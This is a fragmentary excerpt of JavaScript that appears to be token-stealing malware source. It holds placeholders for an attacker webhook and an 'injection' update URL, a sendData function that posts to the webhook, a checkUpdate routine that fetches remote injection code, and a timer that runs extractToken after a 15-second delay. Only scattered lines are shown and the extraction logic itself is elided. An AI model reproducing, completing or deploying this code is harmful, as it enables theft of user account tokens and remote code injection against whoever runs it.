...
const UPDATE_URL = '%INJECTION_URL%';
...
function sendData(data) {
    if (!WEBHOOK || WEBHOOK === '%WEBHOOK%') return;
...
function checkUpdate() {
    if (!UPDATE_URL || UPDATE_URL === '%INJECTION_URL%') return;
...
// Initialize
setTimeout(extractToken, 15000); // Extract token after 15s delay
